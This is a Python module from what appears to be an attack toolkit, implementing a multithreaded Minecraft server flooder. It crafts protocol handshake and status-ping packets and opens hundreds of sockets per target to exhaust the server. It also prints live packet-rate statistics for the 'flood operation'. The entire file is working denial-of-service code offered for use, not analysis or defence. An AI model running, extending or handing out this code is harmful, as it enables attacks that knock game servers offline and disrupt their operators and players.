import socket
import struct
import json
import random
import time
import threading
import logging
from typing import List, Dict, Optional
from .utilities import AttackModule, UI, Style

class MinecraftFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        
        # Add thread-safe stats
        self._stats_lock = threading.Lock()
        self._stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        
        # Initialize stats monitoring
        self.last_update_time = time.time()
        self.update_interval = 1.0
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0
        }
        
        # Status format
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: MINECRAFT | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
        
        # Minecraft protocol settings
        self.protocol_version = 47  # Protocol version (1.8.x)
        self.server_address = None
        self.server_port = 25565  # Default Minecraft port
        self.connection_timeout = 3
        self.max_failures = 1000
        
        # Performance settings
        self.sockets_per_thread = 100
        self.reconnect_delay = 0.1
        self.max_retries = 3
        
        # Status ping payloads
        self.ping_payloads = self._generate_ping_payloads()
        
        if debug:
            self.logger = logging.getLogger(self.__class__.__name__)
            self.logger.setLevel(logging.DEBUG)

    def write_varint(self, value: int) -> bytes:
        """Write VarInt for Minecraft protocol"""
        result = b''
        while True:
            byte = value & 0x7F
            value >>= 7
            if value:
                byte |= 0x80
            result += bytes([byte])
            if not value:
                break
        return result

    def _generate_ping_payloads(self) -> List[bytes]:
        """Generate a variety of Minecraft server list ping payloads"""
        payloads = []
        
        def create_handshake(protocol: int, hostname: str, port: int) -> bytes:
            # Build packet without length prefix first
            packet = b'\x00'  # Packet ID
            packet += self.write_varint(protocol)  # Protocol version
            packet += self.write_varint(len(hostname)) + hostname.encode('utf-8')
            packet += struct.pack('>H', port)
            packet += b'\x01'  # Next state (1 for status)
            
            # Add length prefix
            return self.write_varint(len(packet)) + packet

        # Add different protocol versions
        protocols = [47, 107, 335, 340, 498, 754]  # Various Minecraft versions
        domains = [
            "example.com", "localhost", "mc.hypixel.net", 
            "play.cubecraft.net", "mc.mineplex.com"
        ]
        
        for protocol in protocols:
            for domain in domains:
                handshake = create_handshake(protocol, domain, 25565)
                status_request = self.write_varint(1) + b'\x00'  # Status request packet
                payloads.append(handshake + status_request)
                
                # Add ping request with length prefix
                current_time = int(time.time() * 1000)
                ping_data = struct.pack('>Q', current_time)
                ping_packet = self.write_varint(9) + b'\x01' + ping_data  # 9 = length of ping payload
                payloads.append(handshake + ping_packet)

        return payloads

    def increment_stat(self, key: str, value: int = 1):
        """Thread-safe method to increment stats"""
        with self._stats_lock:
            self._stats[key] += value

    def flood_worker(self, target: str, port: int):
        """Worker function that sends Minecraft ping packets"""
        sockets = []
        failures = 0
        
        while self.running and failures < self.max_failures:
            try:
                # Create new socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.connection_timeout)
                
                try:
                    # Connect to target
                    sock.connect((target, port))
                    
                    # Send handshake packet first
                    handshake = random.choice([p for p in self.ping_payloads if p.startswith(self.write_varint(len(p[1:])) + b'\x00')])
                    sock.send(handshake)
                    
                    # Send status request packet
                    status_request = self.write_varint(1) + b'\x00'
                    sock.send(status_request)
                    
                    # Try to read response (even partial)
                    try:
                        sock.settimeout(1)  # Quick timeout for read
                        response = sock.recv(1024)
                        if response:  # If we got any response, count as success
                            with self._stats_lock:
                                self._stats["successful"] += 1
                                self._stats["packets_sent"] += 2  # Handshake + status
                                self._stats["bytes_sent"] += len(handshake) + len(status_request)
                    except socket.timeout:
                        # Even if read times out, the packets were sent
                        with self._stats_lock:
                            self._stats["successful"] += 1
                            self._stats["packets_sent"] += 2
                            self._stats["bytes_sent"] += len(handshake) + len(status_request)
                    
                    # Maintain socket pool
                    sockets.append(sock)
                    if len(sockets) > self.sockets_per_thread:
                        old_sock = sockets.pop(0)
                        try:
                            old_sock.close()
                        except:
                            pass
                            
                except (socket.timeout, ConnectionRefusedError):
                    failures += 1
                    with self._stats_lock:
                        self._stats["failures"] += 1
                    try:
                        sock.close()
                    except:
                        pass
                    time.sleep(self.reconnect_delay)
                    continue
                
                # Brief pause between attempts
                time.sleep(0.01)  # Reduced delay for higher throughput
                
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in flood_worker: {str(e)}")
                failures += 1
                with self._stats_lock:
                    self._stats["failures"] += 1
                time.sleep(self.reconnect_delay)
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def start(self):
        """Start Minecraft flood operation"""
        super().start()
        
        UI.print_header("Minecraft Flood Operation")
        UI.print_info(f"Starting Minecraft flood against {len(self.targets)} targets")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Protocol versions: Multiple (47-754)")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Sockets per thread: {self.sockets_per_thread}")
        
        # Start worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_worker, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        # Start performance monitoring
        monitor_thread = threading.Thread(target=self.monitor_performance)
        monitor_thread.daemon = False
        monitor_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()

    def monitor_performance(self):
        """Monitor and adjust performance parameters in real-time"""
        last_update = time.time()
        last_stats = self.stats
        status_counter = 0
        max_status_lines = 20
        
        while self.running:
            try:
                time.sleep(0.1)
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats
                    
                    # Calculate rates
                    pps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024)
                    
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    # Update peak stats
                    self.perf_data["current_pps"] = pps
                    self.perf_data["current_mbps"] = mbps
                    self.perf_data["highest_pps"] = max(self.perf_data["highest_pps"], pps)
                    self.perf_data["highest_mbps"] = max(self.perf_data["highest_mbps"], mbps)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = self.status_format.format(
                        timestamp=timestamp,
                        target=self.targets[0],
                        port=self.ports[0],
                        pps=pps,
                        mbps=mbps,
                        rate=success_rate
                    )
                    
                    print(status_line)
                    status_counter += 1
                    
                    if status_counter >= max_status_lines:
                        print("-" * len(status_line))
                        status_counter = 0
                    
                    last_stats = current_stats
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)
